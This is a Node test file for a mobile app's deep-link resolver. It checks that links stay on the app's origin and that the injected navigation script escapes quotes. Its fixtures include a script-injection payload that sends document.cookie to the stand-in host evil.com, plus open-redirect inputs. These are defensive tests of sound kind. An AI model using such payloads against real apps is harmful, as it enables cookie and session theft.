const assert = require('node:assert/strict');
const Module = require('node:module');
const fs = require('node:fs');
const path = require('node:path');
const test = require('node:test');
const ts = require('typescript');

function loadDeepLinkModule() {
  const filePath = path.join(__dirname, '..', 'deepLink.ts');
  const source = fs.readFileSync(filePath, 'utf8');
  const transpiled = ts.transpileModule(source, {
    compilerOptions: {
      module: ts.ModuleKind.CommonJS,
      target: ts.ScriptTarget.ES2020,
      esModuleInterop: true,
    },
    fileName: filePath,
  });

  const moduleInstance = new Module(filePath, module);
  moduleInstance.filename = filePath;
  moduleInstance.paths = Module._nodeModulePaths(path.dirname(filePath));
  moduleInstance._compile(transpiled.outputText, filePath);
  return moduleInstance.exports;
}

const { buildDeepLinkNavigationUrl, buildLocationAssignmentScript } = loadDeepLinkModule();

const WEB_APP_URL = 'https://maeil1dok.app/';
const APP_SCHEME = 'maeil1dok';

test('Given a normal deep link When resolving Then it stays on the web app origin', () => {
  const target = buildDeepLinkNavigationUrl('maeil1dok://groups/42', WEB_APP_URL, APP_SCHEME);
  assert.equal(target, 'https://maeil1dok.app/groups/42');
});

test('Given a deep link with query and fragment When resolving Then they are preserved on origin', () => {
  const target = buildDeepLinkNavigationUrl('maeil1dok://hasena?tab=2#top', WEB_APP_URL, APP_SCHEME);
  assert.equal(target, 'https://maeil1dok.app/hasena?tab=2#top');
});

test('Given a link for another scheme When resolving Then it is ignored', () => {
  assert.equal(buildDeepLinkNavigationUrl('https://evil.com/x', WEB_APP_URL, APP_SCHEME), null);
});

test('Given an auth deep link When resolving Then native handles it and web nav is skipped', () => {
  assert.equal(buildDeepLinkNavigationUrl('maeil1dok://auth/kakao/callback', WEB_APP_URL, APP_SCHEME), null);
});

test('Given a JS-breakout payload When resolving Then it cannot leave the origin', () => {
  const malicious = "maeil1dok://x'; window.location='https://evil.com/'+document.cookie; //";
  const target = buildDeepLinkNavigationUrl(malicious, WEB_APP_URL, APP_SCHEME);
  // Must remain on our origin regardless of payload content.
  assert.ok(target === null || target.startsWith('https://maeil1dok.app/'));
});

test('Given a JS-breakout payload When building the injection script Then quotes are escaped and cannot break out', () => {
  const malicious = "maeil1dok://x'; alert(document.cookie); //";
  const target = buildDeepLinkNavigationUrl(malicious, WEB_APP_URL, APP_SCHEME);
  assert.ok(target !== null);
  const script = buildLocationAssignmentScript(target);
  // The injected statement is `window.location.href = <json>; true;`.
  // The URL must be a JSON string literal (double-quoted) so a single quote
  // in the payload cannot terminate the string and start a new statement.
  const jsonLiteral = script.replace(/^window\.location\.href = /, '').replace(/; true;$/, '');
  assert.equal(JSON.parse(jsonLiteral), target);
  // The URL is embedded as a double-quoted JSON literal, so any single quotes in
  // the payload stay harmlessly inside the string instead of terminating it.
  assert.ok(script.startsWith('window.location.href = "'));
  assert.ok(jsonLiteral.startsWith('"') && jsonLiteral.endsWith('"'));
});

test('Given a protocol-relative path When resolving Then the foreign host stays within our origin', () => {
  const target = buildDeepLinkNavigationUrl('maeil1dok:////evil.com/steal', WEB_APP_URL, APP_SCHEME);
  assert.ok(target === null || target.startsWith('https://maeil1dok.app/'));
  assert.ok(target === null || !target.startsWith('https://evil.com'));
});

test('Given an absolute foreign URL in the path When resolving Then it is rejected', () => {
  const target = buildDeepLinkNavigationUrl('maeil1dok://https://evil.com/steal', WEB_APP_URL, APP_SCHEME);
  // "https://evil.com/steal" resolves to its own origin and is denied.
  assert.equal(target, null);
});

test('Given a non-string input When resolving Then null is returned', () => {
  assert.equal(buildDeepLinkNavigationUrl(undefined, WEB_APP_URL, APP_SCHEME), null);
  assert.equal(buildDeepLinkNavigationUrl(null, WEB_APP_URL, APP_SCHEME), null);
  assert.equal(buildDeepLinkNavigationUrl(42, WEB_APP_URL, APP_SCHEME), null);
});

test('Given the bare scheme When resolving Then the origin root is returned', () => {
  const target = buildDeepLinkNavigationUrl('maeil1dok://', WEB_APP_URL, APP_SCHEME);
  assert.equal(target, 'https://maeil1dok.app/');
});
